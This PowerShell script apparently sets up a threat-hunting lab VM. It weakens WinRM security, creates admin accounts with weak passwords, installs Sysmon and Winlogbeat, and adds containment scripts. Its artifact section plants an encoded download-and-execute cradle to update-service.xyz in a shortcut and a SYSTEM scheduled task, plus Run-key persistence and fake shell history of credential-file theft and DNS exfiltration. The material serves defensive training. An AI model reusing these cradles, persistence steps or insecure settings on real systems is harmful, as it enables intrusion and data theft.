#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Configures a Windows Server Core VM as a threat hunt victim.
    Run INSIDE the golden build VM after OS install.

.DESCRIPTION
    1. Enables WinRM + PS Remoting
    2. Creates team user accounts
    3. Installs Sysmon with kiosk config
    4. Installs Winlogbeat (ships to ELK)
    5. Plants kill chain artifacts
    6. Deploys containment scripts
    7. Deploys Kansa modules
#>

$ErrorActionPreference = "Stop"
$ELKHost = "10.10.1.1"  # Host machine (gateway to Docker ELK)

Write-Host "[*] Configuring threat hunt victim VM..." -ForegroundColor Cyan

# === WINRM + PS REMOTING ===
Write-Host "[+] Enabling WinRM and PS Remoting"
Enable-PSRemoting -Force -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true -Force
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true -Force
# Open firewall for WinRM
New-NetFirewallRule -DisplayName "WinRM-HTTP" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue

# === TEAM ACCOUNTS ===
Write-Host "[+] Creating team accounts"
1..5 | ForEach-Object {
    $user = "team$_"
    $pass = ConvertTo-SecureString "hunt4threats$_" -AsPlainText -Force
    New-LocalUser -Name $user -Password $pass -FullName "Team $_" -Description "Threat Hunt Student" -ErrorAction SilentlyContinue
    Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue
}

# === SYSMON ===
Write-Host "[+] Installing Sysmon"
$sysmonDir = "C:\tools\sysmon"
New-Item -ItemType Directory -Path $sysmonDir -Force | Out-Null

# Download Sysmon
Invoke-WebRequest -Uri "https://live.sysinternals.com/Sysmon64.exe" -OutFile "$sysmonDir\Sysmon64.exe"

# Kiosk-tuned Sysmon config
@'
<Sysmon schemaversion="4.90">
  <HashAlgorithms>sha256,imphash</HashAlgorithms>
  <EventFiltering>
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <ParentImage condition="end with">svchost.exe</ParentImage>
      </ProcessCreate>
    </RuleGroup>
    <RuleGroup name="NetworkConnect" groupRelation="or">
      <NetworkConnect onmatch="include">
        <Image condition="end with">powershell.exe</Image>
        <Image condition="end with">cmd.exe</Image>
        <Image condition="end with">wscript.exe</Image>
        <Image condition="end with">mshta.exe</Image>
        <Image condition="end with">svchost.exe</Image>
      </NetworkConnect>
    </RuleGroup>
    <RuleGroup name="ProcessAccess" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="end with">lsass.exe</TargetImage>
      </ProcessAccess>
    </RuleGroup>
    <RuleGroup name="FileCreate" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="end with">.exe</TargetFilename>
        <TargetFilename condition="end with">.dll</TargetFilename>
        <TargetFilename condition="end with">.ps1</TargetFilename>
        <TargetFilename condition="end with">.lnk</TargetFilename>
        <TargetFilename condition="end with">.bat</TargetFilename>
        <TargetFilename condition="end with">.hta</TargetFilename>
        <TargetFilename condition="contains">\Start Menu\</TargetFilename>
        <TargetFilename condition="contains">\Recent\</TargetFilename>
      </FileCreate>
    </RuleGroup>
    <RuleGroup name="RegistryEvent" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">CurrentVersion\Run</TargetObject>
        <TargetObject condition="contains">Winlogon</TargetObject>
        <TargetObject condition="contains">Image File Execution Options</TargetObject>
        <TargetObject condition="contains">CurrentControlSet\Services</TargetObject>
      </RegistryEvent>
    </RuleGroup>
    <RuleGroup name="DnsQuery" groupRelation="or">
      <DnsQuery onmatch="exclude">
        <QueryName condition="end with">.microsoft.com</QueryName>
        <QueryName condition="end with">.windowsupdate.com</QueryName>
        <QueryName condition="end with">.bing.com</QueryName>
      </DnsQuery>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
'@ | Set-Content "$sysmonDir\config.xml" -Encoding UTF8

& "$sysmonDir\Sysmon64.exe" -accepteula -i "$sysmonDir\config.xml"
Write-Host "    Sysmon installed and running"

# === WINLOGBEAT ===
Write-Host "[+] Installing Winlogbeat"
$wlbVersion = "8.15.0"
$wlbDir = "C:\tools\winlogbeat"
New-Item -ItemType Directory -Path $wlbDir -Force | Out-Null

Invoke-WebRequest -Uri "https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-$wlbVersion-windows-x86_64.zip" -OutFile "C:\temp\winlogbeat.zip"
Expand-Archive "C:\temp\winlogbeat.zip" -DestinationPath "C:\temp\winlogbeat-extract" -Force
Copy-Item "C:\temp\winlogbeat-extract\winlogbeat-*\*" -Destination $wlbDir -Recurse -Force

@"
winlogbeat.event_logs:
  - name: Microsoft-Windows-Sysmon/Operational
    ignore_older: 72h
  - name: Security
    event_id: 4624, 4625, 4648, 4672, 4698, 4702, 4720, 4732
  - name: Microsoft-Windows-AppLocker/EXE and DLL
  - name: Microsoft-Windows-Windows Firewall With Advanced Security/Firewall

output.logstash:
  hosts: ["${ELKHost}:5044"]

processors:
  - add_fields:
      target: host
      fields:
        role: victim
        vlan: public_terminal
"@ | Set-Content "$wlbDir\winlogbeat.yml" -Encoding UTF8

# Install as service
& "$wlbDir\install-service-winlogbeat.ps1"
Start-Service winlogbeat

# === PLANT KILL CHAIN ARTIFACTS ===
Write-Host "[+] Planting kill chain evidence"

# Create attacker workspace
$attackerPath = "C:\Users\Public"
New-Item -ItemType Directory -Path "$attackerPath\Downloads" -Force | Out-Null

# 1. Malicious LNK (Initial Access via USB)
$WshShell = New-Object -ComObject WScript.Shell
$lnk = $WshShell.CreateShortcut("$attackerPath\Desktop\invoice.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = '/c powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAGUAcgB2AGkAYwBlAC4AeAB5AHoALwBzAHQAYQBnAGUAcgAiACkAfABJAEUAWAA='
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,1"
$lnk.Description = "Q3 Invoice - Urgent Review"
$lnk.Save()

# Copy to Recent + Startup for persistence evidence
$startupPath = "C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
Copy-Item "$attackerPath\Desktop\invoice.lnk" "$startupPath\WindowsUpdate.lnk"

# 2. Renamed malicious binary (Defense Evasion)
# Create a dummy exe that's NOT the real svchost
$bytes = [byte[]]::new(4096)
$bytes[0] = 0x4D; $bytes[1] = 0x5A  # MZ header
[System.IO.File]::WriteAllBytes("C:\Windows\Temp\svchost.exe", $bytes)

# 3. Scheduled Task (Persistence)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAGUAcgB2AGkAYwBlAC4AeAB5AHoALwBiAGUAYQBjAG8AbgAiACkAfABJAEUAWAA="
$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date)
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Description "Windows Update Background Service" -Force

# 4. Registry Run Key (Persistence)
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateSvc" -Value "C:\Windows\Temp\svchost.exe" -PropertyType String -Force

# 5. PowerShell History (breadcrumbs)
$historyPath = "C:\Users\Public\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
New-Item -ItemType Directory -Path $historyPath -Force | Out-Null
@"
ipconfig /all
net view
arp -a
nslookup update-service.xyz
net use \\10.10.30.5\share /user:reliefworker Password123
dir \\10.10.30.5\share\credentials
copy \\10.10.30.5\share\credentials\relief-ops.xlsx C:\Windows\Temp\
certutil -encode C:\Windows\Temp\relief-ops.xlsx C:\Windows\Temp\encoded.txt
type C:\Windows\Temp\encoded.txt | powershell -c "[System.Net.Dns]::Resolve('data.update-service.xyz')"
del C:\Windows\Temp\encoded.txt
del C:\Windows\Temp\relief-ops.xlsx
"@ | Set-Content "$historyPath\ConsoleHost_history.txt" -Encoding UTF8

# === CONTAINMENT SCRIPTS ===
Write-Host "[+] Deploying containment tools"
$cafeTools = "C:\cafe-tools"
New-Item -ItemType Directory -Path $cafeTools -Force | Out-Null

# The corrected containment script (default-block architecture)
@'
[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$JumpBoxIP,
    [string]$ELKHost = "10.10.1.1",
    [string]$RulePrefix = "CONTAIN-ALLOW"
)
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# Snapshot current profile state
$snapshot = Get-NetFirewallProfile -All | Select-Object Name, DefaultInboundAction, DefaultOutboundAction, Enabled
$snapshot | ConvertTo-Json | Set-Content "$PSScriptRoot\contain-snapshot.json" -Encoding UTF8

# Remove stale containment rules
Get-NetFirewallRule -DisplayName "$RulePrefix*" -ErrorAction SilentlyContinue | Remove-NetFirewallRule

# Default-block all profiles
Set-NetFirewallProfile -All -DefaultInboundAction Block -DefaultOutboundAction Block

# Allow: jump box (bidirectional)
New-NetFirewallRule -DisplayName "$RulePrefix-JumpBox-In" -Direction Inbound -Action Allow -RemoteAddress $JumpBoxIP -Protocol Any | Out-Null
New-NetFirewallRule -DisplayName "$RulePrefix-JumpBox-Out" -Direction Outbound -Action Allow -RemoteAddress $JumpBoxIP -Protocol Any | Out-Null

# Allow: ELK (Winlogbeat outbound)
New-NetFirewallRule -DisplayName "$RulePrefix-ELK-Out" -Direction Outbound -Action Allow -RemoteAddress $ELKHost -Protocol TCP -RemotePort 5044 | Out-Null

# Allow: DNS to gateway
New-NetFirewallRule -DisplayName "$RulePrefix-DNS-Out" -Direction Outbound -Action Allow -RemoteAddress $ELKHost -Protocol UDP -RemotePort 53 | Out-Null

# Allow: loopback
New-NetFirewallRule -DisplayName "$RulePrefix-Loop-In" -Direction Inbound -Action Allow -RemoteAddress 127.0.0.1 -Protocol Any | Out-Null
New-NetFirewallRule -DisplayName "$RulePrefix-Loop-Out" -Direction Outbound -Action Allow -RemoteAddress 127.0.0.1 -Protocol Any | Out-Null

# Log containment event
$source = "ContainmentScript"
if (-not [Diagnostics.EventLog]::SourceExists($source)) {
    [Diagnostics.EventLog]::CreateEventSource($source, "Application")
}
Write-EventLog -LogName Application -Source $source -EventId 9001 -EntryType Warning -Message "Host contained. JumpBox=$JumpBoxIP ELK=$ELKHost Operator=$env:USERNAME"

Write-Host "Containment active. Verify: Get-NetFirewallProfile -All | Select Name,DefaultInboundAction,DefaultOutboundAction"
'@ | Set-Content "$cafeTools\Invoke-Contain.ps1" -Encoding UTF8

@'
[CmdletBinding()]
param(
    [string]$RulePrefix = "CONTAIN-ALLOW",
    [string]$SnapshotPath = "$PSScriptRoot\contain-snapshot.json"
)
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$removed = 0
$rules = Get-NetFirewallRule -DisplayName "$RulePrefix*" -ErrorAction SilentlyContinue
$rules | Remove-NetFirewallRule
$removed = $rules.Count

if (Test-Path $SnapshotPath) {
    $snapshot = Get-Content $SnapshotPath | ConvertFrom-Json
    $snapshot | ForEach-Object {
        Set-NetFirewallProfile -Name $_.Name -DefaultInboundAction $_.DefaultInboundAction -DefaultOutboundAction $_.DefaultOutboundAction -Enabled $_.Enabled
    }
    Remove-Item $SnapshotPath -Force
    Write-Host "Profile restored from snapshot"
} else {
    Set-NetFirewallProfile -All -DefaultInboundAction NotConfigured -DefaultOutboundAction NotConfigured
    Write-Warning "No snapshot found. Reset to defaults."
}

Write-EventLog -LogName Application -Source ContainmentScript -EventId 9002 -EntryType Information -Message "Containment lifted. Rules removed=$removed Operator=$env:USERNAME"
Write-Host "Decontained. Removed $removed rules."
'@ | Set-Content "$cafeTools\Invoke-Decontain.ps1" -Encoding UTF8

# === CLEANUP ===
Write-Host "[+] Cleanup"
Remove-Item "C:\temp" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host "  Golden image setup complete!" -ForegroundColor Green
Write-Host "  Shut down this VM and it's ready to clone." -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
